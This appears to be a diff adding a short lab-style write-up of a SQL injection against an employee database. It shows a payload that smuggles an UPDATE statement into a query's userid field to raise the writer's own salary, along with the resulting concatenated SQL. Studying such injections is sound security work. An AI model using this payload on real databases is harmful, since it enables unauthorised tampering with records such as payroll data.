@@ -1,0 +1,13 @@
+We begin by query our own data, the SQL command is 
+
+select userid, password, ssn, salary, email from employee where userid=INPUT
+
+We now insert another command after this to update our own salary
+
+INPUT = "1 and 'a'='b' update employee set salary=999999 where userid=101"
+
+The resulting command is 
+
+select userid, password, ssn, salary, email from employee where userid=1 and 'a'='b' update employee set salary=999999 where userid=101
+
+This statement effectvely updates our salary to a higher value
